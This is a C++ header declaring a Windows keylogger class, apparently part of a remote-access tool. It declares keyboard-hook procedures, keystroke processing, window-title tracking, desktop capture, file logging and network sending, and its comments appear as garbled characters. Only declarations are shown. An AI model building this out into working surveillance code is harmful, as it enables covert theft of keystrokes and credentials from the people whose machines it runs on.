#pragma once
#ifndef KBHOOK_H
#define KBHOOK_H

#include "winsock.h"

#pragma comment(lib,"user32.lib")

#define SAVE_SIZE 40*1024
class _KbHook
{
public:
	_KbHook();
	~_KbHook();

	static DWORD __stdcall CreateWindowThread(LPVOID lpParam);
	void CreateWindowHook();
	static LRESULT CALLBACK HookWindowProc(HWND hWndKeylogger, UINT Msg, WPARAM wParam, LPARAM lParam);

	void SendStartHook(char* fileName, int len);
	void SendStopHook();

	void StartHook();
	void StopHook();

	static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
	LRESULT KeyboardHookFunc(int nCode, WPARAM wParam, LPARAM lParam);
	void ProcessKeyInfo(char *Buffer);

	BOOL Desktop_Capture(PCHAR lpWinSta, PCHAR lpDesktop, PCHAR lpFile, DWORD m_dwLastError);

private:
	static _KbHook* m_pThis; //��̬����ָ��

	DWORD m_ThreadID;
	HWND m_hWndKeylogger; //�����Ĵ��ھ��
	HHOOK m_hhook; //���ӱ���
	HWND m_hLastFocus; //��¼��һ�εõ�����Ĵ��ھ��

	HANDLE	m_ThreadHandle;
	bool m_bLogToFile;
	bool m_bSend;
	bool m_bOfflineLog;

	HANDLE m_hCreateWindowEvent; //���ڴ����¼�

	char m_CurrentWindowText[128];
	char m_LastWindowText[128];

	char m_fileName[MAX_PATH];//�����log�ļ���
	HANDLE m_hFile;  //д�ļ����
};

#endif 